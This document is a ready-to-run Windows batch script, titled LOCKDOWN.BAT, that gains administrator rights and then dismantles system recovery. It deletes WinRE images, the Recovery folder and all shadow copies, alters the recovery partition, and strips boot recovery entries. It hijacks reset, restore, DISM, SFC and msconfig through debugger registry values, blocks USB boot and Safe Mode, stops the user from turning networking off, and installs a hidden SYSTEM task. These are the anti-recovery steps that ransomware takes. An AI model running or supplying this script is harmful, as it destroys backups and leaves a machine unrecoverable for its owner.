@echo off
chcp 65001 >nul 2>&1
setlocal EnableDelayedExpansion
:: ============================================
:: LOCKDOWN.BAT - Ultimate System Recovery Blocker
:: Version 2.3 - Enhanced WiFi Protection (cannot disconnect)
:: ============================================

:: Check for --yes argument (bypass confirmations)
set "AUTO_YES=0"
if /i "%~1"=="--yes" set "AUTO_YES=1"
if /i "%~1"=="-y" set "AUTO_YES=1"

:: Check for Administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo ========================================
    echo    ELEVATION REQUISE
    echo ========================================
    echo.
    echo Ce script necessite des droits ADMINISTRATEUR.
    echo Tentative d'elevation automatique...
    echo.
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs" 2>nul
    if !errorLevel! neq 0 (
        echo [ERREUR] Impossible d'obtenir les droits administrateur.
        echo.
        echo Causes possibles:
        echo  - Le popup UAC a ete refuse ou n'est pas apparu
        echo  - Vous n'etes pas connecte avec un compte administrateur
        echo  - UAC est desactive dans les parametres systeme
        echo.
        echo SOLUTION:
        echo  1. Clic droit sur ce script
        echo  2. Choisir "Executer en tant qu'administrateur"
        echo  3. Accepter le popup UAC
        echo.
        if "%AUTO_YES%"=="1" (timeout /t 2 /nobreak >nul) else (pause)
    )
    exit /b
)

echo ==========================================
echo     ULTIMATE SYSTEM LOCKDOWN v2.2
echo ==========================================
echo.
echo NOTE: If downloaded via curl, run from an elevated prompt.
echo.

:: =============================================
:: SECTION 1: WINRE COMPLETE DESTRUCTION
:: =============================================
echo [1] Destroying WinRE (Recovery Environment)...

:: 1.1 Disable WinRE via reagentc
reagentc /disable >nul 2>&1
echo    * WinRE disabled via reagentc.

:: 1.2 Delete ALL WinRE images from ALL known locations
set "WINRE_LOCATIONS=C:\Windows\System32\Recovery\winre.wim C:\Recovery\WindowsRE\winre.wim C:\Recovery\winre.wim C:\$WINDOWS.~BT\Sources\SafeOS\winre.wim"
for %%W in (%WINRE_LOCATIONS%) do (
    if exist "%%W" (
        echo    * Deleting: %%W
        takeown /f "%%W" >nul 2>&1
        icacls "%%W" /grant administrators:F >nul 2>&1
        attrib -h -s -r "%%W" >nul 2>&1
        del /f /q "%%W" >nul 2>&1
    )
)

:: 1.3 Delete entire Recovery folders
if exist "C:\Recovery" (
    echo    * Destroying C:\Recovery folder...
    takeown /f "C:\Recovery" /r /d y >nul 2>&1
    icacls "C:\Recovery" /grant administrators:F /t >nul 2>&1
    attrib -h -s -r "C:\Recovery" /s /d >nul 2>&1
    rd /s /q "C:\Recovery" >nul 2>&1
)

:: 1.4 Remove ReAgent configuration files
for %%F in ("C:\Windows\System32\Recovery\ReAgent.xml" "C:\Recovery\WindowsRE\ReAgent.xml") do (
    if exist "%%F" (
        echo    * Removing config: %%F
        takeown /f "%%F" >nul 2>&1
        icacls "%%F" /grant administrators:F >nul 2>&1
        del /f /q "%%F" >nul 2>&1
    )
)

:: 1.5 Corrupt/block Recovery partition if exists
echo    * Checking for Recovery partition...
powershell -NoProfile -Command "$rp = Get-Partition | Where-Object {$_.Type -eq 'Recovery'}; if($rp) { $rp | Set-Partition -GptType '{ebd0a0a2-b9e5-4433-87c0-68b6b72699c7}' -ErrorAction SilentlyContinue; Write-Host '      -> Recovery partition type modified' } else { Write-Host '      -> No Recovery partition found' }"

echo    * WinRE destruction complete.

:: =============================================
:: SECTION 2: ADVANCED BCD HARDENING
:: =============================================
echo.
echo [2] Hardening Boot Configuration (BCD)...

:: 2.1 Disable recovery for all boot entries
bcdedit /set {current} recoveryenabled No >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {globalsettings} recoveryenabled No >nul 2>&1

:: 2.2 Remove recovery sequences
bcdedit /deletevalue {current} recoverysequence >nul 2>&1
bcdedit /deletevalue {default} recoverysequence >nul 2>&1

:: 2.3 Ignore boot failures completely
bcdedit /set {current} bootstatuspolicy IgnoreAllFailures >nul 2>&1
bcdedit /set {default} bootstatuspolicy IgnoreAllFailures >nul 2>&1

:: 2.4 Disable automatic repair
bcdedit /set {current} autorecoveryenabled No >nul 2>&1
bcdedit /set {default} autorecoveryenabled No >nul 2>&1

:: 2.5 Disable Windows Boot Manager timeout (no time to press F8/F11)
bcdedit /timeout 0 >nul 2>&1

:: 2.6 Disable legacy boot menu (F8 key)
bcdedit /set {default} bootmenupolicy Standard >nul 2>&1
bcdedit /set {current} bootmenupolicy Standard >nul 2>&1

:: 2.7 Delete WinRE boot entry entirely if exists
for /f "tokens=2 delims={}" %%G in ('bcdedit /enum all ^| findstr /i "winre"') do (
    bcdedit /delete {%%G} /f >nul 2>&1
)

:: 2.8 Remove any recovery tools entry
for /f "tokens=2 delims={}" %%G in ('bcdedit /enum all ^| findstr /i "recovery"') do (
    bcdedit /delete {%%G} /f >nul 2>&1
)

echo    * BCD fully hardened.

:: =============================================
:: SECTION 3: BLOCK USB/EXTERNAL BOOT
:: =============================================
echo.
echo [3] Blocking External Boot Sources...

:: 3.1 Disable USB boot devices via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
echo    * USB Storage devices disabled.

:: 3.2 Block CD/DVD boot
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cdrom" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
echo    * CD/DVD devices disabled.

:: 3.3 Disable Secure Boot configuration access (prevents changes)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot" /v AvailableUpdates /t REG_DWORD /d 0 /f >nul 2>&1

:: 3.4 Disable Windows Setup from running
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo SETUP BLOCKED ^& pause" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\oobe.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo OOBE BLOCKED ^& pause" /f >nul 2>&1

echo    * External boot sources blocked.

:: =============================================
:: SECTION 4: IFEO - BLOCK ALL RECOVERY EXECUTABLES
:: =============================================
echo.
echo [4] Blocking ALL Recovery Executables...

:: Block System Reset
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\systemreset.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo SYSTEM RESET BLOCKED ^& timeout /t 3 ^& exit" /f >nul 2>&1

:: Block System Restore
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rstrui.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo SYSTEM RESTORE BLOCKED ^& timeout /t 3 ^& exit" /f >nul 2>&1

:: Block Recovery Drive Creator
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\recoverydrive.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo RECOVERY DRIVE BLOCKED ^& timeout /t 3 ^& exit" /f >nul 2>&1

:: Block Push Button Reset
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srtasks.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo SRTASKS BLOCKED ^& exit" /f >nul 2>&1

:: Block Windows Recovery Tools
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winre.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ReAgentc.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo REAGENTC BLOCKED ^& exit" /f >nul 2>&1

:: Block Startup Repair
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StartupRepairOffline.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f >nul 2>&1

:: Block Fresh Start / Reset This PC tools
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FreshStart.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f >nul 2>&1

:: Block Windows Installer in recovery context
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winload.exe" /v Debugger /t REG_SZ /d "" /f >nul 2>&1

echo    * All recovery executables blocked.

:: =============================================
:: SECTION 5: DISABLE SYSTEM RESTORE COMPLETELY
:: =============================================
echo.
echo [5] Disabling System Restore & Shadow Copies...

:: 5.1 Disable via Group Policy
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1

:: 5.2 Disable System Protection service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\swprv" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VSS" /v Start /t REG_DWORD /d 4 /f >nul 2>&1

:: 5.3 Delete all shadow copies
vssadmin delete shadows /all /quiet >nul 2>&1

:: 5.4 Delete via PowerShell (more reliable)
powershell -NoProfile -Command "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }" >nul 2>&1

echo    * System Restore completely disabled.

:: =============================================
:: SECTION 6: BLOCK SAFE MODE ACCESS
:: =============================================
echo.
echo [6] Blocking Safe Mode Access...

:: 6.1 Remove Safe Mode boot options
bcdedit /deletevalue {default} safeboot >nul 2>&1
bcdedit /deletevalue {current} safeboot >nul 2>&1

:: 6.2 Disable Safe Mode via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v AlternateShell /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v AlternateShell /t REG_SZ /d "" /f >nul 2>&1

:: 6.3 Block msconfig from accessing boot options
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo MSCONFIG BLOCKED ^& timeout /t 3 ^& exit" /f >nul 2>&1

echo    * Safe Mode access blocked.

:: =============================================
:: SECTION 7: DISABLE ADVANCED STARTUP OPTIONS
:: =============================================
echo.
echo [7] Disabling Advanced Startup Options...

:: 7.1 Block Shift+Restart advanced options
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableAdvancedStartup /t REG_DWORD /d 1 /f >nul 2>&1

:: 7.2 Disable boot to UEFI firmware option
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager" /v DisableUEFIFirmwareSettings /t REG_DWORD /d 1 /f >nul 2>&1

:: 7.3 Block access to firmware settings via Windows
powershell -NoProfile -Command "if(Get-Command Set-ItemProperty -ErrorAction SilentlyContinue) { Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'DisableFirmwareSettingsMenu' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue }"

:: 7.4 Disable boot options display
bcdedit /set {globalsettings} advancedoptions false >nul 2>&1
bcdedit /set {globalsettings} optionsedit false >nul 2>&1

:: 7.5 Disable bootlog
bcdedit /set {current} bootlog No >nul 2>&1

echo    * Advanced startup options disabled.

:: =============================================
:: SECTION 8: BLOCK COMMAND PROMPT IN RECOVERY
:: =============================================
echo.
echo [8] Blocking Recovery Command Prompt Access...

:: 8.1 Block cmd.exe in WinRE context only
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\recenv.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f >nul 2>&1

:: 8.2 Block Windows RE command shell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRecoveryConsole /t REG_DWORD /d 1 /f >nul 2>&1

:: NOTE: DisableCMD removed - it blocks .bat scripts for standard users

echo    * Recovery command prompt blocked.

:: =============================================
:: SECTION 9: HIDE ALL RECOVERY UI
:: =============================================
echo.
echo [9] Hiding Recovery UI Elements...

:: 9.1 Hide Settings pages
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v SettingsPageVisibility /t REG_SZ /d "hide:recovery;backup;windowsupdate-options;windowsupdate-restartoptions;troubleshoot" /f >nul 2>&1

:: 9.2 Hide for all users (Default profile)
reg add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v SettingsPageVisibility /t REG_SZ /d "hide:recovery;backup;windowsupdate-options;windowsupdate-restartoptions;troubleshoot" /f >nul 2>&1

:: 9.3 Block Troubleshooters
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v SettingsPageVisibility /t REG_SZ /d "hide:recovery;backup;troubleshoot" /f >nul 2>&1

echo    * Recovery UI completely hidden.

:: =============================================
:: SECTION 10: ADDITIONAL HARDENING
:: =============================================
echo.
echo [10] Additional Security Hardening...

:: 10.1 Disable Windows Update's recovery features
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableOSUpgrade /t REG_DWORD /d 1 /f >nul 2>&1

:: 10.2 Disable Push-button reset
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CloudExperienceHost\Intent\recovery" /v Disabled /t REG_DWORD /d 1 /f >nul 2>&1

:: 10.3 Block DISM recovery operations
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dism.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo DISM BLOCKED ^& exit" /f >nul 2>&1

:: 10.4 Disable automatic maintenance (can trigger recovery checks)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v MaintenanceDisabled /t REG_DWORD /d 1 /f >nul 2>&1

:: 10.5 Disable SFC (System File Checker)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sfc.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo SFC BLOCKED ^& exit" /f >nul 2>&1

:: 10.6 Disable Windows Error Recovery
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoInteractiveServices /t REG_DWORD /d 1 /f >nul 2>&1

:: 10.7 Block BitLocker recovery (if BitLocker is used)
reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseAdvancedStartup /t REG_DWORD /d 0 /f >nul 2>&1

echo    * Additional hardening complete.

:: =============================================
:: SECTION 11: DISABLE SLEEP/HIBERNATION
:: =============================================
echo.
echo [11] Disabling Sleep and Hibernation...

:: 11.1 Disable hibernation completely
powercfg /hibernate off >nul 2>&1
echo    * Hibernation disabled.

:: 11.2 Disable sleep on AC power (0 = never)
powercfg /change standby-timeout-ac 0 >nul 2>&1
echo    * Sleep on AC: DISABLED.

:: 11.3 Disable sleep on battery (0 = never)
powercfg /change standby-timeout-dc 0 >nul 2>&1
echo    * Sleep on battery: DISABLED.

:: 11.4 Disable monitor timeout (optional, keep screens on)
:: powercfg /change monitor-timeout-ac 0 >nul 2>&1
:: powercfg /change monitor-timeout-dc 0 >nul 2>&1

:: 11.5 Disable hybrid sleep
powercfg /setacvalueindex SCHEME_CURRENT SUB_SLEEP HYBRIDSLEEP 0 >nul 2>&1
powercfg /setdcvalueindex SCHEME_CURRENT SUB_SLEEP HYBRIDSLEEP 0 >nul 2>&1
echo    * Hybrid sleep disabled.

:: 11.6 Apply power scheme changes
powercfg /setactive SCHEME_CURRENT >nul 2>&1

echo    * Sleep/Hibernation completely disabled.

:: =============================================
:: SECTION 12: ENABLE WAKE-ON-LAN
:: =============================================
echo.
echo [12] Configuring Wake-on-LAN...

:: 12.1 Allow network adapter to wake computer (via registry for all adapters)
for /f "tokens=*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}" /s /v "*WakeOnMagicPacket" 2^>nul ^| findstr /i "HKEY"') do (
    reg add "%%A" /v "*WakeOnMagicPacket" /t REG_SZ /d "1" /f >nul 2>&1
    reg add "%%A" /v "*WakeOnPattern" /t REG_SZ /d "1" /f >nul 2>&1
    reg add "%%A" /v "PnPCapabilities" /t REG_DWORD /d 0 /f >nul 2>&1
)

:: 12.2 Enable WoL via PowerShell (more reliable for modern NICs)
powershell -NoProfile -Command "$adapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}; foreach($a in $adapters) { $a | Set-NetAdapterPowerManagement -WakeOnMagicPacket Enabled -ErrorAction SilentlyContinue; Set-NetAdapterAdvancedProperty -Name $a.Name -DisplayName 'Wake on Magic Packet' -DisplayValue 'Enabled' -ErrorAction SilentlyContinue }" >nul 2>&1

:: 12.3 Prevent Windows from disabling NIC to save power
powershell -NoProfile -Command "$adapters = Get-NetAdapter; foreach($a in $adapters) { $a | Set-NetAdapterPowerManagement -AllowComputerToTurnOffDevice $false -ErrorAction SilentlyContinue }" >nul 2>&1

:: 12.4 Enable fast startup exception for WoL
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f >nul 2>&1

echo    * Wake-on-LAN enabled.
echo    * Network adapter will stay powered for remote wake.

:: =============================================
:: SECTION 13: INTERNET PRIORITY - Keep Connected (Allow WiFi Change)
:: =============================================
echo.
echo [13] Internet Priority Protection...

:: 13.1 Disable Airplane Mode (prevents complete disconnect)
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Connectivity" /v AllowAirplaneMode /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Connectivity" /v AllowAirplaneMode /t REG_DWORD /d 0 /f >nul 2>&1
echo    * Airplane Mode disabled.

:: 13.2 Block network adapter disable (prevent turning WiFi off)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Network Connections" /v NC_LanChangeProperties /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Network Connections" /v NC_EnableAdminProhibits /t REG_DWORD /d 1 /f >nul 2>&1
echo    * WiFi adapter cannot be disabled.

:: 13.3 Keep WLAN AutoConfig service always running
powershell -NoProfile -Command "$svc = Get-Service -Name 'WlanSvc' -ErrorAction SilentlyContinue; if($svc) { Set-Service -Name 'WlanSvc' -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service -Name 'WlanSvc' -ErrorAction SilentlyContinue }" >nul 2>&1

:: 13.4 Block device manager tools (prevent adapter disable)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\devcon.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo DEVCON BLOCKED ^& exit" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pnputil.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo PNPUTIL BLOCKED - Admin required ^& exit" /f >nul 2>&1
echo    * Device control commands blocked.

:: 13.5 Auto-reconnect task: Check internet every 30 seconds
echo    * Creating auto-reconnect task...
powershell -NoProfile -WindowStyle Hidden -Command "& {$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command \"& { try { $ping = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction Stop; if (-not $ping) { netsh wlan connect name=(netsh wlan show interfaces | Select-String ''SSID'' | ForEach-Object { $_.ToString().Split('':'')[1].Trim() }) } } catch {} }\"'; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 1); Register-ScheduledTask -TaskName 'NoWin_InternetGuard' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -Force | Out-Null}" >nul 2>&1
echo    * Auto-reconnect task created (checks every 1 min).

echo.
echo    * Internet priority enabled.
echo    * User CAN change WiFi network but CANNOT turn WiFi OFF.

:: =============================================
:: SECTION 14: RESTART EXPLORER
:: =============================================
echo.
echo [14] Restarting Explorer to apply changes...
taskkill /F /IM explorer.exe >nul 2>&1
start explorer.exe

echo.
echo ==========================================
echo       LOCKDOWN COMPLETE (v2.2)
echo ==========================================
echo.
echo Protected against:
echo  [X] WinRE / Recovery Environment
echo  [X] USB Boot / External Media
echo  [X] Safe Mode
echo  [X] Advanced Startup Options (Shift+Restart)
echo  [X] System Reset / Fresh Start
echo  [X] System Restore / Shadow Copies
echo  [X] Recovery Command Prompt
echo  [X] DISM / SFC recovery tools
echo  [X] Sleep / Hibernation DISABLED
echo  [X] Wake-on-LAN ENABLED
echo  [X] WiFi Disconnect BLOCKED (can still change networks)
echo.
echo NOTE: BIOS/UEFI access requires physical security
echo       (BIOS password must be set manually)
echo.
if "%AUTO_YES%"=="1" (echo [AUTO] Lockdown termine.) else (pause)
